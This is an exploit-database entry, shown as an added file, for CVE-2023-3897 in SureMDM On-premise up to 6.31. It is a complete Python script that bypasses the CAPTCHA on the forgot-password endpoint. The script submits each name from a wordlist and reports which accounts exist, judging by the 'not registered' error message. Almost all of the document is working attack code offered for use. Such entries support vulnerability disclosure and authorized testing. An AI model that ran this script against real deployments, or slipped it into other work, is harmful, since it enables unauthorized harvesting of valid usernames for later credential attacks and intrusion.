@@ -1,0 +1,62 @@
+id: 39342
+date: 02/19/2024
+title: SureMDM On-premise < 6.31 - CAPTCHA Bypass User Enumeration Exploit
+author: Jonas Benjamin Friedli
+cves: CVE-2023-3897
+
+# Exploit Title: SureMDM On-premise < 6.31 - CAPTCHA Bypass User Enumeration
+# Exploit Author: Jonas Benjamin Friedli
+# Vendor Homepage: https://www.42gears.com/products/mobile-device-management/
+# Version: <= 6.31
+# Tested on: 6.31
+# CVE : CVE-2023-3897
+
+import requests
+import sys
+
+def print_help():
+    print("Usage: python script.py [URL] [UserListFile]")
+    sys.exit(1)
+
+
+def main():
+    if len(sys.argv) != 3 or sys.argv[1] == '-h':
+        print_help()
+
+    url, user_list_file = sys.argv[1], sys.argv[2]
+
+    try:
+        with open(user_list_file, 'r') as file:
+            users = file.read().splitlines()
+    except FileNotFoundError:
+        print(f"User list file '{user_list_file}' not found.")
+        sys.exit(1)
+
+    valid_users = []
+    bypass_dir = "/ForgotPassword.aspx/ForgetPasswordRequest"
+    enumerate_txt = "This User ID/Email ID is not registered."
+    for index, user in enumerate(users):
+        progress = (index + 1) / len(users) * 100
+        print(f"Processing {index + 1}/{len(users)} users ({progress:.2f}%)", end="\r")
+
+        data = {"UserId": user}
+        response = requests.post(
+            f"{url}{bypass_dir}",
+            json=data,
+            headers={"Content-Type": "application/json; charset=utf-8"}
+        )
+
+        if response.status_code == 200:
+            response_data = response.json()
+            if enumerate_txt not in response_data.get('d', {}).get('message', ''):
+                valid_users.append(user)
+
+    print("\nFinished processing users.")
+    print(f"Valid Users Found: {len(valid_users)}")
+    for user in valid_users:
+        print(user)
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-02-22]  #
